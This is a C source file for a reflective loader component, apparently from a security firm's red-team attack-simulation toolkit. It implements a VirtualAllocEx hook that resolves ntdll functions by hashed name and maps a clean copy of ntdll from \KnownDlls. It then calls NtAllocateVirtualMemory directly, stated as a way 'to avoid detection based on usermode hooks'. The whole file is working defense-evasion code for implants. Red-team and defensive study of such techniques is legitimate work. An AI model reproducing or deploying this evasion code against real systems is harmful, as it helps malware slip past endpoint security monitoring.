/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

typedef struct
{
	D_API( NtQueryInformationProcess );
	D_API( RtlNtStatusToDosError );
	D_API( RtlSetLastWin32Error );
	D_API( NtUnmapViewOfSection );
	D_API( RtlInitUnicodeString );
	D_API( NtMapViewOfSection );
	D_API( RtlAllocateHeap );
	D_API( NtOpenSection );
	D_API( RtlFreeHeap );
	D_API( NtClose );
} API ;

typedef struct
{
	D_API( NtAllocateVirtualMemory );
} SYS ;

#define H_API_NTQUERYINFORMATIONPROCESS	0x8cdc5dc2
#define H_API_NTALLOCATEVIRTUALMEMORY	0xf783b8ec
#define H_API_RTLNTSTATUSTODOSERROR	0x39d7c890
#define H_API_RTLSETLASTWIN32ERROR	0xfd303374
#define H_API_NTUNMAPVIEWOFSECTION	0x6aa412cd
#define H_API_RTLINITUNICODESTRING	0xef52b589
#define H_API_NTMAPVIEWOFSECTION	0xd6649bca
#define H_API_RTLALLOCATEHEAP		0x3be94c5a
#define H_API_NTOPENSECTION		0x134eda0e
#define H_API_RTLFREEHEAP		0x73a9e4d7
#define H_API_NTCLOSE			0x40d6e69d
#define H_LIB_NTDLL			0x1edab0ed

/*!
 *
 * Purpose:
 *
 * Maps a copy of \\KnownDlls\\ntdll and calls
 * the underlying NT call to avoid detection
 * based on usermode hooks.
 *
!*/
D_SEC( D ) LPVOID WINAPI VirtualAllocEx_Hook( _In_ HANDLE hProcess, LPVOID Address, SIZE_T Length, DWORD Type, DWORD Protect )
{
	API			Api;
	SYS			Sys;
	UNICODE_STRING		Uni;
	OBJECT_ATTRIBUTES	Att;

	SIZE_T			Len = 0;
	NTSTATUS		Nst = STATUS_SUCCESS;
	
	HANDLE			Sec = NULL;
	PVOID			Ntm = NULL;
	PVOID			Wow = NULL;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Sys, sizeof( Sys ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
	RtlSecureZeroMemory( &Att, sizeof( Att ) );

	Api.NtQueryInformationProcess = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYINFORMATIONPROCESS );
	Api.RtlNtStatusToDosError     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLNTSTATUSTODOSERROR );
	Api.RtlSetLastWin32Error      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLSETLASTWIN32ERROR );
	Api.NtUnmapViewOfSection      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTUNMAPVIEWOFSECTION );
	Api.RtlInitUnicodeString      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING );
	Api.NtMapViewOfSection        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTMAPVIEWOFSECTION );
	Api.RtlAllocateHeap           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.NtOpenSection             = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTOPENSECTION );
	Api.RtlFreeHeap               = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
	Api.NtClose                   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	Api.RtlInitUnicodeString( &Uni, C_PTR( G_SYM( L"\\KnownDlls\\ntdll.dll" ) ) );
	if ( NT_SUCCESS( Api.NtQueryInformationProcess( NtCurrentProcess(), ProcessWow64Information, &Wow, sizeof( Wow ), NULL ) ) ) {
		if ( Wow != NULL ) {
			Api.RtlInitUnicodeString( &Uni, C_PTR( G_SYM( L"\\KnownDlls32\\ntdll.dll" ) ) );
		};
	};
	InitializeObjectAttributes( &Att, &Uni, OBJ_CASE_INSENSITIVE, NULL, NULL );

	if ( NT_SUCCESS( ( Nst = Api.NtOpenSection( &Sec, SECTION_MAP_EXECUTE | SECTION_MAP_READ, &Att ) ) ) ) {
		if ( NT_SUCCESS( ( Nst = Api.NtMapViewOfSection( Sec, NtCurrentProcess(), &Ntm, 0, 0, NULL, &Len, ViewUnmap, 0, PAGE_READONLY ) ) ) ) {
			Sys.NtAllocateVirtualMemory = PeGetFuncEat( Ntm, H_API_NTALLOCATEVIRTUALMEMORY );
			Nst = Sys.NtAllocateVirtualMemory( hProcess, &Address, 0, &Length, Type, Protect );
			Api.NtUnmapViewOfSection( NtCurrentProcess(), Ntm );
		};
		Api.NtClose( Sec );
	};
	Api.RtlSetLastWin32Error( Api.RtlNtStatusToDosError( Nst ) ); return Address;
};
